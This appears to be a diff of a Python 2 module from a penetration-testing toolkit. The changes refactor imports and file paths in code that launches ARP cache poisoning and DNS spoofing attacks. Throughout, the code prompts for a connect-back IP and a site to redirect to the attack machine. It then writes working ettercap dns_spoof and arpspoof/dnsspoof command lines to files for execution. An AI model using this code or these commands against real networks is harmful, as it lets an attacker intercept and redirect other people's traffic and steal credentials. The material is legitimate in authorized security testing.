@@ -4,7 +4,7 @@ import pexpect
 import os
 import time
 import sys
-from src.core import setcore
+from src.core.setcore import *
 
 # Define to use ettercap or dsniff or nothing.
 #
@@ -24,13 +24,13 @@ for line in config:
     # check for ettercap choice here
     match1=re.search("ETTERCAP=ON",line)
     if match1:
-        setcore.print_info("ARP Cache Poisoning is set to " + setcore.bcolors.GREEN + "ON" + setcore.bcolors.ENDC)
+        print_info("ARP Cache Poisoning is set to " + bcolors.GREEN + "ON" + bcolors.ENDC)
         ettercapchoice='y'
 
     # check for dsniff choice here
     match2=re.search("DSNIFF=ON", line)
     if match2:
-        setcore.print_info("DSNIFF DNS Poisoning is set to " + setcore.bcolors.GREEN + "ON" + setcore.bcolors.ENDC)
+        print_info("DSNIFF DNS Poisoning is set to " + bcolors.GREEN + "ON" + bcolors.ENDC)
         dsniffchoice = 'y'
         ettercapchoice = 'n'
 
@@ -62,7 +62,7 @@ if ettercapchoice== 'y':
     if check_options("IPADDR=") != 0:
         ipaddr = check_options("IPADDR=")
     else:
-        ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on: "))
+        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
         update_options("IPADDR=" + ipaddr)
 
     if ettercapchoice == 'y':
@@ -78,8 +78,8 @@ if ettercapchoice== 'y':
 
   IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
 """
-            setcore.print_info("Example: http://www.google.com")
-            dns_spoof=raw_input(setcore.setprompt("0", "Site to redirect to attack machine [*]"))
+            print_info("Example: http://www.google.com")
+            dns_spoof=raw_input(setprompt("0", "Site to redirect to attack machine [*]"))
             os.chdir(path)
             # small fix for default
             if dns_spoof == "":
@@ -97,24 +97,18 @@ if ettercapchoice== 'y':
             bridge=""
             # assign -M arp to arp variable
             arp="-M arp"
-            # grab input from user
-            #bridge_q=raw_input(setcore.setprompt("0", "Use bridged mode [yes|no]"))
-            #if bridge_q == "y" or bridge_q == "yes":
-             #   bridge_int=raw_input(setcore.setprompt("0", "Network interface for the bridge"))
-              #  bridge="-B "+str(bridge_int)
-                #arp=""
-            setcore.print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
+            print_error("LAUNCHING ETTERCAP DNS_SPOOF ATTACK!")
             # spawn a child process
             os.chdir(cwd)
             time.sleep(5)
-            filewrite=file("src/program_junk/ettercap","w")
+            filewrite=file(setdir + "/ettercap","w")
             filewrite.write("ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface,arp,bridge))
             filewrite.close()
             os.chdir(cwd)
         except Exception, error:
             os.chdir(cwd)
             #log(error)
-            setcore.print_error("ERROR:An error has occured:")
+            print_error("ERROR:An error has occured:")
             print "ERROR:" +str(error)
 
 # if we are using dsniff
@@ -124,7 +118,7 @@ if dsniffchoice == 'y':
     if check_options("IPADDR=") != 0:
         ipaddr = check_options("IPADDR=")
     else:
-        ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on: "))
+        ipaddr = raw_input(setprompt("0", "IP address to connect back on: "))
         update_options("IPADDR=" + ipaddr)
 
     if dsniffchoice == 'y':
@@ -140,26 +134,26 @@ if dsniffchoice == 'y':
 
   IF YOU WANT TO POISON ALL DNS ENTRIES (DEFAULT) JUST HIT ENTER OR *
 """
-            setcore.print_info("Example: http://www.google.com")
-            dns_spoof=raw_input(setcore.setprompt("0", "Site to redirect to attack machine [*]"))
+            print_info("Example: http://www.google.com")
+            dns_spoof=raw_input(setprompt("0", "Site to redirect to attack machine [*]"))
             #os.chdir(path)
             # small fix for default
             if dns_spoof == "":
                 dns_spoof="*"
-            subprocess.Popen("rm src/program_junk/dnsspoof.conf 1> /dev/null 2> /dev/null", shell=True).wait()
-            filewrite=file("src/program_junk/dnsspoof.conf", "w")
+            subprocess.Popen("rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (setdir), shell=True).wait()
+            filewrite=file(setdir + "/dnsspoof.conf", "w")
             filewrite.write("%s %s" % (ipaddr, dns_spoof))
             filewrite.close()
-            setcore.print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
+            print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
             # spawn a child process
             os.chdir(cwd)
             # time.sleep(5)
             # grab default gateway, should eventually replace with pynetinfo python module
             gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
             # open file for writing
-            filewrite=file("src/program_junk/ettercap","w")
+            filewrite=file(setdir + "/ettercap","w")
             # write the arpspoof / dnsspoof commands to file
-            filewrite.write("arpspoof %s | dnsspoof -f src/program_junk/dnsspoof.conf" % (gateway))
+            filewrite.write("arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway,setdir))
             # close the file
             filewrite.close()
             # change back to normal directory
@@ -170,5 +164,5 @@ if dsniffchoice == 'y':
             os.chdir(cwd)
             #log(error)
             # print error message
-            setcore.print_error("ERROR:An error has occurred:")
-            print setcore.bcolors.RED + "ERROR" + str(error) + setcore.bcolors.ENDC
+            print_error("ERROR:An error has occurred:")
+            print bcolors.RED + "ERROR" + str(error) + bcolors.ENDC
